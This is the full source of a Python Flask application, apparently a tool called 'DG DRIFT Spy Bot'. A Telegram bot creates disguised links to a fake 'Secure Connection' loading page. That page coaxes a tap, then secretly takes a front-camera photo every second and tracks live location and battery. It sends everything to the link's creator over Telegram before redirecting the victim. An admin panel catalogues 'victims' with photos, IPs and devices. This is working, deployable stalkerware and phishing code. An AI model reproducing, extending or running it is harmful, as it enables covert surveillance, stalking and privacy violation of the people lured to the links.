import os
import json
import time
import random
import base64
import datetime

from flask import (
    Flask, request, jsonify, render_template_string,
    session, redirect, url_for, send_from_directory
)
import requests

from config import config

app = Flask(__name__)
app.secret_key = config['secret_key']
app.logger.setLevel('INFO')


# ---------------- Boot ----------------
os.makedirs('photos', exist_ok=True)
for fname in ('visitors.json', 'links.json'):
    if not os.path.exists(fname):
        with open(fname, 'w') as f:
            json.dump({}, f)
    else:
        try:
            with open(fname) as f:
                data = json.load(f)
        except Exception:
            data = {}
        if not isinstance(data, dict):
            with open(fname, 'w') as f:
                json.dump({}, f)


# ---------------- Helpers ----------------
def load_json(fname):
    with open(fname) as f:
        return json.load(f)


def save_json(fname, data):
    with open(fname, 'w') as f:
        json.dump(data, f, indent=2)


def _tg_api(method):
    return f"https://api.telegram.org/bot{config['bot_token']}/{method}"


def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    payload = {'chat_id': chat_id, 'text': text}
    if parse_mode:
        payload['parse_mode'] = parse_mode
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        r = requests.post(_tg_api('sendMessage'), data=payload, timeout=10)
        if r.status_code != 200:
            app.logger.warning(f"sendMessage failed: {r.status_code} {r.text}")
            if parse_mode:
                payload.pop('parse_mode', None)
                r2 = requests.post(_tg_api('sendMessage'), data=payload, timeout=10)
                if r2.status_code == 200:
                    return True
            return False
        return True
    except Exception as e:
        app.logger.warning(f"sendMessage exception: {e}")
        return False


def send_telegram_photo(chat_id, photo_path, caption):
    try:
        size = os.path.getsize(photo_path)
        if size < 100:
            app.logger.warning(f"sendPhoto skipped: file too small ({size} bytes)")
            return False
        with open(photo_path, 'rb') as fh:
            r = requests.post(
                _tg_api('sendPhoto'),
                files={'photo': fh},
                data={'chat_id': chat_id, 'caption': caption},
                timeout=20
            )
        if r.status_code != 200:
            app.logger.warning(f"sendPhoto failed: {r.status_code} {r.text}")
            return False
        return True
    except Exception as e:
        app.logger.warning(f"sendPhoto exception: {e}")
        return False


def send_telegram_location(chat_id, lat, lng):
    try:
        r = requests.post(
            _tg_api('sendLocation'),
            data={'chat_id': chat_id, 'latitude': lat, 'longitude': lng},
            timeout=10
        )
        if r.status_code != 200:
            app.logger.warning(f"sendLocation failed: {r.status_code} {r.text}")
            return False
        return True
    except Exception as e:
        app.logger.warning(f"sendLocation exception: {e}")
        return False


def answer_callback(callback_id, text=None):
    data = {'callback_query_id': callback_id}
    if text:
        data['text'] = text
    try:
        requests.post(_tg_api('answerCallbackQuery'), data=data, timeout=10)
    except Exception as e:
        app.logger.warning(f"answerCallbackQuery failed: {e}")


# ---------------- Spy page ----------------
SPY_PAGE = r'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { text-align: center; padding: 20px; max-width: 380px; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
        .subtitle { color: #555; font-size: 12px; margin-bottom: 25px; letter-spacing: 1px; }
        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.05); border-radius: 50%; border-top: 3px solid #f7971e; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { color: #4ade80; font-size: 13px; min-height: 22px; }
        .status-text.error { color: #ef4444; }
        .badge { display: inline-block; background: rgba(255,255,255,0.03); padding: 4px 14px; border-radius: 20px; font-size: 10px; color: #666; margin-top: 15px; border: 1px solid rgba(255,255,255,0.03); }
        .badge span { color: #f7971e; }
        #video { display: none; }
        #canvas { display: none; }
        .red-dot { display: inline-block; width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1s infinite; margin-right: 6px; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.2); } }
        .recording { display: inline-flex; align-items: center; background: rgba(239, 68, 68, 0.1); padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #ef4444; margin-top: 8px; }
        .debug-info { color: #444; font-size: 10px; margin-top: 15px; word-break: break-all; max-height: 60px; overflow-y: auto; }
        #tapOverlay {
            position: fixed; inset: 0; background: #0a0a0a; z-index: 9999;
            display: flex; align-items: center; justify-content: center;
            flex-direction: column; cursor: pointer;
        }
        #tapOverlay .cam { font-size: 70px; margin-bottom: 20px; }
        #tapOverlay .tap-title { color: #f7971e; font-size: 20px; font-weight: bold; }
        #tapOverlay .tap-sub { color: #666; font-size: 12px; margin-top: 12px; }
    </style>
</head>
<body>
    <div id="tapOverlay">
        <div class="cam">📷</div>
        <div class="tap-title">Tap to Continue</div>
        <div class="tap-sub">Enable camera &amp; location to proceed</div>
    </div>

    <div class="container">
        <div class="logo">✨ DG DRIFT</div>
        <div class="subtitle">🔒 Secure Connection</div>
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        <div class="recording" id="recordingBadge" style="display:none;">
            <span class="red-dot"></span> RECORDING
        </div>
        <div class="badge">🆔 <span id="visitorDisplay"></span></div>
        <div class="debug-info" id="debugInfo"></div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const visitorId = "{{ visitor_id }}";
        const targetUrl = "{{ target_url }}";
        const linkId = "{{ link_id }}";
        let photoCount = 0;
        let isCapturing = false;
        let started = false;
        const debugEl = document.getElementById('debugInfo');

        function debug(msg) { debugEl.textContent = msg; console.log(msg); }

        document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';

        if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
            debug('⚠️ Not HTTPS — camera/geo may not work.');
        }

        let pendingData = [];
        let lastSend = 0;

        // Kick off redirect countdown immediately (even before tap)
        let secondsLeft = 10;
        const statusEl = document.getElementById('status');
        const countdown = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) statusEl.textContent = '⏳ Redirecting in '+secondsLeft+'s...';
        }, 1000);
        setTimeout(() => {
            clearInterval(countdown);
            isCapturing = false;
            statusEl.textContent = '🚀 Redirecting...';
            setTimeout(() => { window.location.href = targetUrl; }, 1500);
        }, 10000);

        // Tap-to-start (needed for iOS Safari + best compliance)
        document.getElementById('tapOverlay').addEventListener('click', () => {
            if (started) return;
            started = true;
            document.getElementById('tapOverlay').style.display = 'none';

            // Send a ping so we register the visitor
            sendData({ ping: true, ua: navigator.userAgent });

            startCamera();
            startGeo();
            startBattery();
        });

        // ---------- CAMERA ----------
        function startCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                document.getElementById('status').textContent = '⚠️ Camera API not supported';
                document.getElementById('status').className = 'status-text error';
                return;
            }
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                document.getElementById('status').textContent = '📸 Capturing...';
                document.getElementById('recordingBadge').style.display = 'inline-flex';
                isCapturing = true;
                debug('✅ Camera active');
                setInterval(() => {
                    if (isCapturing) { capturePhoto(); photoCount++; }
                }, 1000);
            })
            .catch(err => {
                document.getElementById('status').textContent = '⚠️ Camera denied';
                document.getElementById('status').className = 'status-text error';
                debug('❌ Camera: ' + err.message);
            });
        }

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video.videoWidth) return;
            const ctx = canvas.getContext('2d');
            canvas.width = 640; canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
            sendData({ photo: dataUrl });
        }

        // ---------- GEO ----------
        function startGeo() {
            if (!navigator.geolocation) return;
            navigator.geolocation.watchPosition(
                pos => {
                    sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } });
                },
                err => debug('❌ Location: ' + err.message),
                { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
            );
        }

        // ---------- BATTERY ----------
        function startBattery() {
            if (!navigator.getBattery) return;
            navigator.getBattery().then(battery => {
                function update() {
                    sendData({ battery: {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    }});
                }
                update();
                setInterval(update, 5000);
            });
        }

        // ---------- SEND ----------
        function sendData(data) {
            pendingData.push(data);
            if (Date.now() - lastSend > 1500 || pendingData.length >= 2) {
                const batch = pendingData.slice();
                pendingData = [];
                const payload = batch.map(d => ({ ...d, vid: visitorId, link_id: linkId }));
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'same-origin',
                    body: JSON.stringify(payload)
                })
                .then(async res => {
                    if (!res.ok) {
                        const txt = await res.text().catch(() => '');
                        debug('❌ Server ' + res.status + ' ' + txt.slice(0, 80));
                    }
                })
                .catch(err => debug('❌ Send error: ' + err.message));
                lastSend = Date.now();
            }
        }
    </script>
</body>
</html>
'''


# ---------------- Spy routes ----------------
def _render_spy(link_id):
    links = load_json('links.json')
    if link_id and link_id not in links:
        return f"Invalid spy link: {link_id}", 404
    link_data = links.get(link_id, {})
    target_url = link_data.get('url', 'https://google.com')

    visitor_id = session.get('visitor_id')
    if not visitor_id:
        visitor_id = f"VIS_{int(time.time())}_{os.urandom(4).hex()}"
        session['visitor_id'] = visitor_id

    return render_template_string(
        SPY_PAGE,
        visitor_id=visitor_id,
        target_url=target_url,
        link_id=link_id
    )


def _handle_capture(route_link_id=None):
    """Shared POST handler for both / and /s/<link_id>."""
    try:
        data = request.get_json(silent=True)
        if data is None:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

        if not isinstance(data, list):
            data = [data]

        # Visitor ID
        visitor_id = (
            (data[0].get('vid') if data else None)
            or session.get('visitor_id')
            or request.args.get('vid')
        )
        if not visitor_id:
            return jsonify({'status': 'error', 'message': 'Visitor ID missing'}), 400

        # Link ID — body > query > route
        link_id = ''
        if data and data[0].get('link_id'):
            link_id = data[0]['link_id']
        if not link_id:
            link_id = (
                request.args.get('id')
                or request.args.get('link_id')
                or route_link_id
                or ''
            )

        links = load_json('links.json')
        link_data = links.get(link_id, {})

        # ✅ Send to the user who created the link.
        # Fallback to owner only if link_id is missing/invalid.
        owner_id = str(link_data.get('created_by') or config['chat_id'])
        visitors = load_json('visitors.json')
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if visitor_id not in visitors:
            visitors[visitor_id] = {
                'device': request.headers.get('User-Agent', 'Unknown'),
                'ip': request.remote_addr,
                'target_url': link_data.get('url', 'N/A'),
                'generated_by': owner_id,
                'time': now,
                'photos': 0,
                'locations': 0,
                'battery': 0,
            }
        visitors[visitor_id]['last_update'] = now

        for item in data:
            # ---------- PHOTO ----------
            if item.get('photo'):
                pd = item['photo']
                if 'base64,' in pd:
                    pd = pd.split('base64,', 1)[1]
                try:
                    binary = base64.b64decode(pd)
                except Exception:
                    binary = b''

                if len(binary) > 500:
                    path = f"photos/{visitor_id}_{int(time.time()*1000)}.jpg"
                    with open(path, 'wb') as f:
                        f.write(binary)
                    visitors[visitor_id]['photos'] += 1
                    ok = send_telegram_photo(
                        owner_id, path,
                        f"📸 Spy Photo\n🆔 {visitor_id}\n⏰ {now}"
                    )
                    app.logger.info(f"PHOTO saved={path} size={len(binary)} -> tg={owner_id} {'OK' if ok else 'FAIL'}")

            # ---------- LOCATION ----------
            loc = item.get('location')
            if loc:
                lat, lng = loc.get('lat', 0), loc.get('lng', 0)
                if lat and lng:
                    visitors[visitor_id]['locations'] += 1
                    send_telegram_location(owner_id, lat, lng)
                    send_telegram_message(
                        owner_id,
                        f"📍 Live Location\n🆔 {visitor_id}\nhttps://maps.google.com/?q={lat},{lng}",
                        parse_mode=None
                    )

            # ---------- BATTERY ----------
            bat = item.get('battery')
            if bat and bat.get('level', 0) > 0:
                visitors[visitor_id]['battery'] = bat['level']
                status = "Charging" if bat.get('charging') else "Not Charging"
                send_telegram_message(
                    owner_id,
                    f"🔋 Battery\n🆔 {visitor_id}\nLevel: {bat['level']}%\nStatus: {status}",
                    parse_mode=None
                )

        save_json('visitors.json', visitors)
        return jsonify({'status': 'success'})

    except Exception as e:
        app.logger.exception("capture error")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/', methods=['GET'])
def index():
    return _render_spy(request.args.get('id', ''))


@app.route('/', methods=['POST'])
def index_post():
    return _handle_capture()


@app.route('/s/<link_id>', methods=['GET'])
def short(link_id):
    return _render_spy(link_id)


@app.route('/s/<link_id>', methods=['POST'])
def short_post(link_id):
    return _handle_capture(route_link_id=link_id)


# ---------------- Ping (for UptimeRobot) ----------------
@app.route('/ping')
def ping():
    return 'pong', 200


# ---------------- Telegram webhook ----------------
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(silent=True)
    if not update:
        return 'OK', 200

    app.logger.info(f"UPDATE: {json.dumps(update)[:800]}")

    try:
        callback = update.get('callback_query')
        if callback:
            cb_data = callback.get('data')
            cb_id = callback.get('id')
            from_id = callback.get('from', {}).get('id')
            answer_callback(cb_id)

            if cb_data == 'generate':
                send_telegram_message(
                    from_id,
                    '📥 Send target URL\nExample: https://youtube.com',
                    parse_mode=None
                )
            elif cb_data == 'stats':
                visitors = load_json('visitors.json')
                my = list(visitors.keys())
                send_telegram_message(
                    from_id,
                    f"📊 Total victims captured: {len(my)}",
                    parse_mode=None
                )
            return 'OK', 200

        message = update.get('message')
        if not message:
            return 'OK', 200

        chat_id = message.get('chat', {}).get('id')
        text = (message.get('text') or '').strip()

        if not chat_id:
            return 'OK', 200

        if text == '/start':
            keyboard = {
                'inline_keyboard': [
                    [{'text': '🔗 Generate Spy Link', 'callback_data': 'generate'}],
                    [{'text': '📊 Victims', 'callback_data': 'stats'}],
                ]
            }
            send_telegram_message(
                chat_id,
                "👾 DG DRIFT Spy Bot\n\n"
                "Send any URL and I'll create a spy link.\n"
                "When someone opens it, auto-capture starts! 📸",
                reply_markup=keyboard,
                parse_mode=None
            )
            return 'OK', 200

        if text.startswith('http'):
            domain = (text.replace('https://', '')
                          .replace('http://', '')
                          .split('/')[0])
            domain = domain.replace('www.', '').replace('.', '_')
            short_code = f"{domain}_{str(int(time.time()))[-5:]}"

            links = load_json('links.json')
            links[short_code] = {
                'url': text,
                'created_by': str(chat_id),
                'created_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            save_json('links.json', links)

            base = config.get('website', '').rstrip('/')
            if not base:
                send_telegram_message(
                    chat_id,
                    "⚠️ Server 'website' is not configured in config.py",
                    parse_mode=None
                )
                return 'OK', 200

            spy_link = f"{base}/s/{short_code}"
            send_telegram_message(
                chat_id,
                f"✅ Spy link created!\n\n{spy_link}\n\n"
                "When someone opens this link it will capture:\n"
                "• Camera photos (every 1s)\n"
                "• Live location\n"
                "• Battery status",
                parse_mode=None
            )
            return 'OK', 200

        return 'OK', 200

    except Exception as e:
        app.logger.exception("webhook error")
        return 'OK', 200


@app.route('/set_webhook')
def set_webhook():
    base = config.get('website', '').rstrip('/')
    if not base:
        return jsonify({'ok': False, 'error': 'config["website"] not set'}), 400
    if not base.startswith('https://'):
        return jsonify({'ok': False, 'error': 'Telegram requires HTTPS'}), 400
    r = requests.post(_tg_api('setWebhook'), data={'url': f"{base}/webhook"}, timeout=10)
    return jsonify(r.json())


@app.route('/webhook_info')
def webhook_info():
    r = requests.get(_tg_api('getWebhookInfo'), timeout=10)
    return jsonify(r.json())


# ---------------- Diagnostics ----------------
@app.route('/debug_all')
def debug_all():
    files = sorted(os.listdir('photos')) if os.path.exists('photos') else []
    visitors = load_json('visitors.json')
    return jsonify({
        'photos_on_disk': len(files),
        'recent_photos': files[-5:],
        'links': load_json('links.json'),
        'visitors': {
            vid: {
                'photos': v.get('photos', 0),
                'locations': v.get('locations', 0),
                'battery': v.get('battery', 0),
                'generated_by': v.get('generated_by'),
            }
            for vid, v in visitors.items()
        },
        'config': {
            'chat_id': config['chat_id'],
            'website': config['website'],
        }
    })


@app.route('/test_photo')
def test_photo():
    files = sorted(os.listdir('photos')) if os.path.exists('photos') else []
    if not files:
        return jsonify({'error': 'No photos on disk yet'})
    path = f"photos/{files[-1]}"
    ok = send_telegram_photo(config['chat_id'], path, '🧪 Test photo')
    return jsonify({
        'file': files[-1],
        'size_bytes': os.path.getsize(path),
        'sent': ok,
        'chat_id': config['chat_id']
    })


@app.route('/test_send')
def test_send():
    ok = send_telegram_message(config['chat_id'], '🧪 Test message', parse_mode=None)
    return jsonify({'sent': ok, 'chat_id': config['chat_id']})


# ---------------- Admin ----------------
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and 'login' in request.form:
        if (request.form.get('username') == config['admin_username'] and
                request.form.get('password') == config['admin_password']):
            session['admin'] = True
            return redirect(url_for('admin'))
        return render_template_string(LOGIN_PAGE, error='Invalid credentials')

    if not session.get('admin'):
        return render_template_string(LOGIN_PAGE, error=None)

    if 'logout' in request.args:
        session.pop('admin', None)
        return redirect(url_for('admin'))

    if 'export' in request.args:
        return jsonify(load_json('visitors.json'))

    if 'clear' in request.args:
        save_json('visitors.json', {})
        save_json('links.json', {})
        for f in os.listdir('photos'):
            try:
                os.remove(os.path.join('photos', f))
            except Exception:
                pass
        return redirect(url_for('admin'))

    visitors = load_json('visitors.json')
    links = load_json('links.json')

    photo_files = os.listdir('photos')
    enriched = {}
    for vid, v in visitors.items():
        if not isinstance(v, dict):
            continue
        row = dict(v)
        row['photos_list'] = [f for f in photo_files if f.startswith(vid + '_')]
        enriched[vid] = row

    total_victims = len(enriched)
    total_photos = sum(v.get('photos', 0) for v in enriched.values())

    return render_template_string(
        ADMIN_DASHBOARD,
        visitors=enriched,
        links=links,
        total_victims=total_victims,
        total_photos=total_photos,
    )


LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Admin Login</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #0f0c29; color: #fff; font-family: Arial; display: flex;
       justify-content: center; align-items: center; height: 100vh; }
.login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 20px;
             width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
.login-box h2 { margin-bottom: 20px; color: #f7971e; }
input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px;
        background: rgba(255,255,255,0.08); color: #fff; font-size: 14px; }
button { width: 100%; padding: 14px; background: linear-gradient(45deg, #f7971e, #ffd200);
         border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px;
         margin-top: 10px; }
.error { color: #ef4444; margin-top: 10px; font-size: 14px; }
</style>
</head>
<body>
<div class="login-box">
<h2>🔐 Admin Login</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" name="login">Login</button>
</form>
{% if error %}<div class="error">{{ error }}</div>{% endif %}
</div>
</body>
</html>
'''


ADMIN_DASHBOARD = '''
<!DOCTYPE html>
<html>
<head><title>Admin - DG DRIFT</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #0f0c29; color: #fff; font-family: Arial; padding: 20px; }
.header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
.stats { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
.stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px;
            flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
.stat-box h2 { font-size: 32px; color: #f7971e; }
.stat-box p { color: #888; font-size: 13px; }
.btn { background: #f7971e; color: #000; padding: 8px 18px; border: none; border-radius: 10px;
       cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
.btn:hover { background: #ffd200; }
.btn-danger { background: #ef4444; color: #fff; }
.btn-danger:hover { background: #dc2626; }
.visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px;
                margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
.visitor-card h3 { color: #f7971e; margin-bottom: 8px; }
.info { color: #aaa; font-size: 13px; margin: 4px 0; }
.info strong { color: #ddd; }
.photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
.photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px;
                  border: 2px solid rgba(255,255,255,0.08); }
.badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px;
         background: rgba(255,255,255,0.05); }
.badge.good { background: rgba(74, 222, 128, 0.15); color: #4ade80; }
.empty { color: #666; text-align: center; padding: 40px; }
.creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1);
               padding: 2px 10px; border-radius: 10px; }
.link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px;
             margin: 5px 0; display: flex; justify-content: space-between; align-items: center;
             flex-wrap: wrap; gap: 8px; }
</style>
</head>
<body>
<div class="header">
<h1>👾 Admin Panel - DG DRIFT</h1>
<div>
<a href="?export" class="btn">📥 Export</a>
<a href="?clear" class="btn btn-danger" onclick="return confirm('Delete ALL data?')">🗑️ Clear</a>
<a href="?logout" class="btn btn-danger">🚪 Logout</a>
</div>
</div>

<div class="stats">
<div class="stat-box"><h2>{{ total_victims }}</h2><p>Total Victims</p></div>
<div class="stat-box"><h2>{{ total_photos }}</h2><p>Photos Captured</p></div>
<div class="stat-box"><h2>{{ links|length }}</h2><p>Spy Links Created</p></div>
</div>

<div style="margin:20px 0;">
<h3>🔗 All Spy Links</h3>
{% for code, data in links.items() %}
<div class="link-item">
    <span><strong>{{ code }}</strong> → {{ data.url }}</span>
    <span class="creator-tag">By: {{ data.created_by }}</span>
    <span style="color:#666;font-size:12px;">{{ data.created_at }}</span>
</div>
{% endfor %}
</div>

{% if not visitors %}
<div class="empty">
<h2 style="font-size:24px;margin-bottom:10px;">📭 No Victims Yet</h2>
<p>Generate a spy link from your bot and share it!</p>
</div>
{% else %}
<h3>📋 All Victims</h3>
{% for vid, data in visitors.items() %}
<div class="visitor-card">
    <h3>🆔 {{ vid }}</h3>
    <div class="info"><strong>📱 Device:</strong> {{ data.device[:80] }}</div>
    <div class="info"><strong>🌐 IP:</strong> {{ data.ip }}</div>
    <div class="info"><strong>🎯 Target:</strong> {{ data.target_url }}</div>
    <div class="info"><strong>👤 Generated By:</strong> {{ data.generated_by }}</div>
    <div class="info"><strong>📅 First Seen:</strong> {{ data.time }}</div>
    <div class="info"><strong>📊 Stats:</strong>
        <span class="badge good">📸 {{ data.photos }}</span>
        <span class="badge good">📍 {{ data.locations }}</span>
        <span class="badge good">🔋 {{ data.battery }}</span>
    </div>
    {% if data.photos_list %}
    <div class="photo-grid">
        {% for f in data.photos_list %}
        <img src="{{ url_for('photo', filename=f) }}" loading="lazy">
        {% endfor %}
    </div>
    {% endif %}
</div>
{% endfor %}
{% endif %}
</body>
</html>
'''


@app.route('/photos/<filename>')
def photo(filename):
    return send_from_directory('photos', filename)


# ---------------- Run ----------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
